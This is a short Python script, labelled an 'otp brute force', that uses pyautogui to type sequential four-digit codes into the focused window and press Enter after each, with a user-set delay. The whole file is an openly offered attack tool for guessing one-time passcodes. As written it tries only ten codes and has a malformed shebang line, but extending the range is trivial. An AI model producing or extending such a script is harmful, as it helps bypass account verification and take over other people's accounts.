#! /python otp brute force 
import time
import pyautogui as do

delay = int(input("Enter Time Delay "))

time.sleep(5)

for i in range(10):
    time.sleep(delay)
    do.write(str(i).zfill(4))
    do.press("Enter")






